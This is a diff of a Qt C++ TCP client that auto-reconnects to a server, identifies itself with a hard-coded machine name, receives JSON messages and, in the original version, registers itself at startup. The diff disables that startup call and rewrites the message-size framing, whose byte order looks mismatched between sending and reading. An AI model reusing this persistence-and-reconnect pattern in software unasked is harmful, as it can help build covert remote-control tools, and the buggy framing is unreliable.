@@ -6,23 +6,23 @@ QClient::QClient(QString h, qint16 p, QObject *parent) :
     sock = new QTcpSocket(this);
 	connect(sock, SIGNAL(connected()), this, SLOT(connected()));
 	connect(sock, SIGNAL(disconnected()), this, SLOT(disconnected()));
-	connect(sock, SIGNAL(disconnected()), this, SLOT(disconnected()));
 	connect(sock, SIGNAL(disconnected()), this, SLOT(tryToConnect()));
 	connect(sock, SIGNAL(readyRead()), this, SLOT(readyRead()));
 
 	tryToConnect();
 
 	compName = "Doru";
-	addStartup();
+	//addStartup();
 }
 
 void QClient::tryToConnect()
 {
-	sock->connectToHost(host, port);
+		sock->connectToHost(host, port);
 }
 
 void QClient::connected()
 {
+	qDebug() << "CONNECTED";
 	sendData(compName.toUtf8());
 }
 
@@ -36,9 +36,12 @@ void QClient::readyRead()
 	if (sock->bytesAvailable())
 	{
 		//read size of package then the JSON object
-		int size = sock->read(sizeof(int)).toInt();
-		QByteArray data = sock->read(size);
-		QJsonDocument doc = QJsonDocument::fromJson(data);
+		int blockSize = -1;
+		sock->read((char *)&blockSize, sizeof(int));
+		//should check whether the local machine is big endian
+		auto sz = qToLittleEndian(blockSize);
+		QByteArray data = sock->read(sz);
+ 		QJsonDocument doc = QJsonDocument::fromJson(data);
 		QJsonObject resp;
 		qDebug() << data;
 		if (doc.isObject())
@@ -230,7 +233,15 @@ void QClient::message(const QString &m)
 
 void QClient::sendData(const QByteArray &data)
 {
-	sock->write(QByteArray::number(data.size()));
+	
+	int size = data.size();
+	char s[4];
+	s[3] = size & 0xFF;
+	s[2] = (size >> 8) & 0xFF;
+	s[1] = (size >> 16) & 0xFF;
+	s[0] = (size >> 24) & 0xFF;
+
+	sock->write(s, 4);
 	sock->write(data);
 	sock->waitForBytesWritten();
 }
